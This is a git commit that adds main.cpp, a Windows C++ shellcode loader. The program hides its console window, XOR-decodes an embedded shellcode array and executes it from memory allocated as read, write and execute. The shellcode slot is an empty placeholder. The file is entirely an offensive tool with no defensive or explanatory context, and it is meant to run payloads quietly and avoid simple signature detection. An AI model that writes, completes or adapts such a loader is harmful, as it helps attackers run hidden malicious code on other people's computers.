1c1f4e64300d827df9b1fab2896e579c1c142de2
Dimitris Kalopisis <74763463+3ct0s@users.noreply.github.com>
2021-10-11 23:18:48 +0300

    Create main.cpp

---
+++ main.cpp
@@ -0,0 +1,13 @@
+#include <cstring>
+#define _WIN32_WINNT 0x0500
+#include<windows.h>
+ 
+int main(int argc, char **argv) {
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	char b[] = { /*xor_shellcode*/};
+	char c[sizeof b];
+	for (int i = 0; i < sizeof b; i++) {c[i] = b[i] ^ 'x';}
+	void *exec = VirtualAlloc(0, sizeof c, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	memcpy(exec, c, sizeof c);
+	((void(*)())exec)();		
+}
